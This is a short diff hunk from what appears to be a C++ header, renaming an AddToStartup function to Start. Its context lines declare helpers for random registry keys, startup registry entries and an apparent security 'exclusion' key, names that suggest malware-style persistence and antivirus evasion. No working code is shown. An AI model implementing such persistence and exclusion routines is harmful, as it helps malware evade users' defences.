@@ -18,4 +18,4 @@
 std::wstring GenerateRandomRegistryKey(int length);
 void SetStartupRegistryKey(const std::wstring& registryKey, const std::wstring& value);
 void SetExclusionRegistryKey(const wchar_t* value);
-void AddToStartup(void);
+void Start(void);
